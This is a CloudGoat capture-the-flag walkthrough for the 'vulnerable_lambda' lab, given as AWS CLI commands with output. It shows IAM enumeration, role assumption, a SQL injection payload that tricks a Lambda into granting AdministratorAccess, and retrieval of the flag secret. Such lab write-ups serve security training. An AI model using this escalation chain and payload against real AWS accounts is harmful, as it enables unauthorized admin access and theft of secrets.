**Scenario: vulnerable_lambda**

```bash
~/cloudgoat$ aws configure --profile bilbo
AWS Access Key ID [None]: AK
AWS Secret Access Key [None]: K
Default region name [None]:
Default output format [None]:
```

```bash
~/cloudgoat$ aws iam list-users
{
"Users": [
{
"Path": "/",
"UserName": "cg-bilbo-vulnerable_lambda_cgide7iyq5x9t1",
"UserId": "AIDA6QRD2LZQKWU6HM5LO",
"Arn": "arn:aws:iam::997581282912:user/cg-bilbo-vulnerable_lambda_cgide7iyq5x9t1",
"CreateDate": "2024-10-03T00:32:17+00:00"
}
]
}
```

```bash
~/cloudgoat$ aws --profile bilbo sts get-caller-identity
{
"UserId": "AIDA6QRD2LZQKWU6HM5LO",
"Account": "997581282912",
"Arn": "arn:aws:iam::997581282912:user/cg-bilbo-vulnerable_lambda_cgide7iyq5x9t1"
}
```

```bash
~/cloudgoat$ aws --profile bilbo iam list-users
{
"Users": [
{
"Path": "/",
"UserName": "cg-bilbo-vulnerable_lambda_cgide7iyq5x9t1",
"UserId": "AIDA6QRD2LZQKWU6HM5LO",
"Arn": "arn:aws:iam::997581282912:user/cg-bilbo-vulnerable_lambda_cgide7iyq5x9t1",
"CreateDate": "2024-10-03T00:32:17+00:00"
}
]
}
```

```bash
~/cloudgoat$ aws --profile bilbo iam list-user-policies --user-name cg-bilbo-vulnerable_lambda_cgide7iyq5x9t1
{
"PolicyNames": [
"cg-bilbo-vulnerable_lambda_cgide7iyq5x9t1-standard-user-assumer"
]
}
```

```bash
~/cloudgoat$ aws --profile bilbo iam get-user-policy --user-name cg-bilbo-vulnerable_lambda_cgide7iyq5x9t1 --policy-name cg-bilbo-vulnerable_lambda_cgide7iyq5x9t1-standard-user-assumer
{
"UserName": "cg-bilbo-vulnerable_lambda_cgide7iyq5x9t1",
"PolicyName": "cg-bilbo-vulnerable_lambda_cgide7iyq5x9t1-standard-user-assumer",
"PolicyDocument": {
"Version": "2012-10-17",
"Statement": [
{
"Action": "sts:AssumeRole",
"Effect": "Allow",
"Resource": "arn:aws:iam::940877411605:role/cg-lambda-invoker*",
"Sid": ""
},
{
"Action": [
"iam:Get*",
"iam:List*",
"iam:SimulateCustomPolicy",
"iam:SimulatePrincipalPolicy"
],
"Effect": "Allow",
"Resource": "*",
"Sid": ""
}
]
}
}
```

```bash
~/cloudgoat$ aws --profile bilbo iam list-roles | grep cg-
"RoleName": "cg-lambda-invoker-vulnerable_lambda_cgide7iyq5x9t1",
"Arn": "arn:aws:iam::997581282912:role/cg-lambda-invoker-vulnerable_lambda_cgide7iyq5x9t1",
"AWS": "arn:aws:iam::997581282912:user/cg-bilbo-vulnerable_lambda_cgide7iyq5x9t1"
```

```bash
~/cloudgoat$ aws --profile bilbo iam list-role-policies --role-name cg-lamb
da-invoker-vulnerable_lambda_cgide7iyq5x9t1
{
"PolicyNames": [
"lambda-invoker"
]
}
```

```bash
~/cloudgoat$ aws --profile bilbo iam get-role-policy --role-name cg-lambda-invoker-vulnerable_lambda_cgide7iyq5x9t1 --policy-name lambda-invoker
{
"RoleName": "cg-lambda-invoker-vulnerable_lambda_cgide7iyq5x9t1",
"PolicyName": "lambda-invoker",
"PolicyDocument": {
"Version": "2012-10-17",
"Statement": [
{
"Action": [
"lambda:ListFunctionEventInvokeConfigs",
"lambda:InvokeFunction",
"lambda:ListTags",
"lambda:GetFunction",
"lambda:GetPolicy"
],
"Effect": "Allow",
"Resource": "arn:aws:lambda:us-east-1:997581282912:function:vulnerable_lambda_cgide7iyq5x9t1-policy_applier_lambda1"
},
{
"Action": [
"lambda:ListFunctions",
"iam:Get*",
"iam:List*",
"iam:SimulateCustomPolicy",
"iam:SimulatePrincipalPolicy"
],
"Effect": "Allow",
"Resource": "*"
}
]
}
}
```

```bash
~/cloudgoat$ aws --profile bilbo --region us-east-1 lambda list-functions
An error occurred (AccessDeniedException) when calling the ListFunctions operation: User: arn:aws:iam::997581282912:user/cg-bilbo-vulnerable_lambda_cgide7iyq5x9t1 is not authorized to perform: lambda:ListFunctions on resource: * because no identity-based policy allows the lambda:ListFunctions action
```

```bash
~/cloudgoat$ aws --profile bilbo --region us-east-1 sts assume-role --role-arn arn:aws:iam::997581282912:role/cg-lambda-invoker-vulnerable_lambda_cgide7iyq5x9t1 --role
-session-name bilbo-assume-role
{
"Credentials": {
"AccessKeyId": "AS",
"SecretAccessKey": "so",
"SessionToken": "IQ",
"Expiration": "2024-10-03T02:41:11+00:00"
},
"AssumedRoleUser": {
"AssumedRoleId": "AROA6QRD2LZQH2VA3JVCA:bilbo-assume-role",
"Arn": "arn:aws:sts::997581282912:assumed-role/cg-lambda-invoker-vulnerable_lambda_cgide7iyq5x9t1/bilbo-assume-role"
}
}
```

Append this credentials into .aws/credentials file

```bash
[bilbo-lambda]
aws_access_key_id = AS
aws_secret_access_key = so
aws_session_token = aaaaa
```

```bash
~/cloudgoat$ aws --profile bilbo-lambda --region us-east-1 lambda list-func
tions
{
"Functions": [
{
"FunctionName": "vulnerable_lambda_cgide7iyq5x9t1-policy_applier_lambda1",
"FunctionArn": "arn:aws:lambda:us-east-1:997581282912:function:vulnerable_lambda_cgide7iyq5x9t1-policy_applier_lambda1",
"Runtime": "python3.9",
"Role": "arn:aws:iam::997581282912:role/vulnerable_lambda_cgide7iyq5x9t1-policy_applier_lambda1",
"Handler": "main.handler",
"CodeSize": 991559,
"Description": "This function will apply a managed policy to the user of your choice, so long as the database says that it's okay...",
"Timeout": 3,
"MemorySize": 128,
"LastModified": "2024-10-03T00:32:25.347+0000",
"CodeSha256": "U982lU6ztPq9QlRmDCwlMKzm4WuOfbpbCou1neEBHkQ=",
"Version": "$LATEST",
"TracingConfig": {
"Mode": "PassThrough"
},
"RevisionId": "9f295fa8-96e8-414f-9b21-6351af02a991",
"PackageType": "Zip",
"Architectures": [
"x86_64"
],
"EphemeralStorage": {
"Size": 512
},
"SnapStart": {
"ApplyOn": "None",
"OptimizationStatus": "Off"
},
"LoggingConfig": {
"LogFormat": "Text",
"LogGroup": "/aws/lambda/vulnerable_lambda_cgide7iyq5x9t1-policy_applier_lambda1"
}
}
]
}
```

```bash
~/cloudgoat$ aws --profile bilbo-lambda --region us-east-1 lambda get-function --function-name vulnerable_lambda_cgide7iyq5x9t1-policy_applier_lambda1
{
"Configuration": {
"FunctionName": "vulnerable_lambda_cgide7iyq5x9t1-policy_applier_lambda1",
"FunctionArn": "arn:aws:lambda:us-east-1:997581282912:function:vulnerable_lambda_cgide7iyq5x9t1-policy_applier_lambda1",
"Runtime": "python3.9",
"Role": "arn:aws:iam::997581282912:role/vulnerable_lambda_cgide7iyq5x9t1-policy_applier_lambda1",
"Handler": "main.handler",
"CodeSize": 991559,
"Description": "This function will apply a managed policy to the user of your choice, so long as the database says that it's okay...",
"Timeout": 3,
"MemorySize": 128,
"LastModified": "2024-10-03T00:32:25.347+0000",
"CodeSha256": "U982lU6ztPq9QlRmDCwlMKzm4WuOfbpbCou1neEBHkQ=",
"Version": "$LATEST",
"TracingConfig": {
"Mode": "PassThrough"
},
"RevisionId": "9f295fa8-96e8-414f-9b21-6351af02a991",
"State": "Active",
"LastUpdateStatus": "Successful",
"PackageType": "Zip",
"Architectures": [
"x86_64"
],
"EphemeralStorage": {
"Size": 512
},
"SnapStart": {
"ApplyOn": "None",
"OptimizationStatus": "Off"
},
"RuntimeVersionConfig": {
"RuntimeVersionArn": "arn:aws:lambda:us-east-1::runtime:4b9806e1cdd0fd84da9f06bddce167a8f7569f1e856ebedae2e14f44bbaa6999"
},
"LoggingConfig": {
"LogFormat": "Text",
"LogGroup": "/aws/lambda/vulnerable_lambda_cgide7iyq5x9t1-policy_applier_lambda1"
}
},
"Code": {
"RepositoryType": "S3",
"Location": "https://prod-04-2014-tasks.s3.us-east-1.amazonaws.com/snapshots/"
},
"Tags": {
"Name": "cg-vulnerable_lambda_cgide7iyq5x9t1",
"Scenario": "vulnerable-lambda",
"Stack": "CloudGoat"
}
}
```

Download the source code and view [main.py](http://main.py/) it displays the Database structer in the comment, Now craft a SQL injection payload and save it in payload.json

```bash
#payload.json
{
"policy_names": ["AdministratorAccess' -- "],
"user_name": "cg-bilbo-vulnerable_lambda_cgide7iyq5x9t1"
}
```

```bash
~/cloudgoat$ aws --profile bilbo-lambda --region us-east-1 lambda invoke --function-name vulnerable_lambda_cgide7iyq5x9t1-policy_applier_lambda1 --cli-binary-format raw-in-base64-out --payload file://./payload.json out.txt
{
"StatusCode": 200,
"ExecutedVersion": "$LATEST"
}
```

```bash
~/cloudgoat$ cat out.txt
"All managed policies were applied as expected."
```

```bash
~/cloudgoat$ aws --profile bilbo --region us-east-1 secretsmanager list-sec
rets
{
"SecretList": [
{
"ARN": "arn:aws:secretsmanager:us-east-1:997581282912:secret:vulnerable_lambda_cgide7iyq5x9t1-final_flag-nhbYXC",
"Name": "vulnerable_lambda_cgide7iyq5x9t1-final_flag",
"LastChangedDate": "2024-10-02T20:32:17.873000-04:00",
"LastAccessedDate": "2024-10-02T20:00:00-04:00",
"Tags": [
{
"Key": "Scenario",
"Value": "vulnerable-lambda"
},
{
"Key": "Stack",
"Value": "CloudGoat"
},
{
"Key": "Name",
"Value": "cg-vulnerable_lambda_cgide7iyq5x9t1"
}
],
"SecretVersionsToStages": {
"terraform-20241003003218083100000002": [
"AWSCURRENT"
]
},
"CreatedDate": "2024-10-02T20:32:17.354000-04:00"
}
]
}
```

```bash
~/cloudgoat$ aws --profile bilbo --region us-east-1 secretsmanager get-secret-value --secret-id arn:aws:secretsmanager:us-east-1:997581282912:secret:vulnerable_lambda_cgide7iyq5x9t1-final_flag-nhbYXC
{
"ARN": "arn:aws:secretsmanager:us-east-1:997581282912:secret:vulnerable_lambda_cgide7iyq5x9t1-final_flag-nhbYXC",
"Name": "vulnerable_lambda_cgide7iyq5x9t1-final_flag",
"VersionId": "terraform-20241003003218083100000002",
"SecretString": "cg-secret-846237-284529",
"VersionStages": [
"AWSCURRENT"
],
"CreatedDate": "2024-10-02T20:32:17.868000-04:00"
}
```

### cg-secret-846237-284529
